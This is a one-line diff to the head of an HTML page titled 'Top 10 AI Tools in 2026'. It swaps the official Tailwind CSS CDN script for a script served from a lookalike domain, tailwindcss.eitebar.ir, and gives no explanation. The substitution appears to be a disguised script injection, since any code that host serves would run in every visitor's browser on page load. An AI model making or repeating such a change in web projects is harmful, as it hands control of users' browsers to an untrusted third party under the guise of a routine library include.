@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Top 10 AI Tools in 2026</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://tailwindcss.eitebar.ir"></script>
 </head>
 <body class="bg-gray-100 text-gray-800 font-sans antialiased min-h-screen cursor-pointer">
     <!-- Navigation -->
